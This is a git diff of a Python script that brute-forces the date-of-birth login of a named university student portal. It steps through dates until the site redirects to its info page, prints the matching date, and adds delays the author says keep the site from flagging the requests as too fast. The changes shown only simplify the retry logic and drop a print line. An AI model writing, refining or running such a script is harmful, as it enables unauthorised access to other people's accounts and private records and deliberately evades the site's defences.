@@ -29,7 +29,6 @@ Date=1
 
 
 accessable=False
-retry=False
 
 baseURL = 'https://sis.manipal.edu/'
 studentAppend = "studlogin.aspx"
@@ -75,13 +74,12 @@ while((not accessable)):
     cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies))
     time.sleep(10)
     
-    req = requests.post(baseURL+studentAppend,headers=headers,data=mydata,cookies =cookies)
-    retry=(not retry)
+    req = requests.post(baseURL+studentAppend,headers=headers,data=mydata,cookies =cookies)    
     if(req.url=="https://sis.manipal.edu/geninfo.aspx"):
         accessable=True
         print("required DOB: ")
         print(dob.strftime("%d/%m/%Y"))
-    elif(not retry):       
+    else:       
         Date+=1;
         print(dob.strftime("%d/%m/%Y")+" failed\n")
         try:
@@ -91,9 +89,6 @@ while((not accessable)):
             Date=1
             dob=datetime.datetime(Year,Month,Date)
     time.sleep(2)
-
-print("EXISTENCE IS PAIN")
-
 
 
 # The site realizes that it isn't humanely possible for a person to query so fast hence i've kept the total time delay for each check to be 13secs
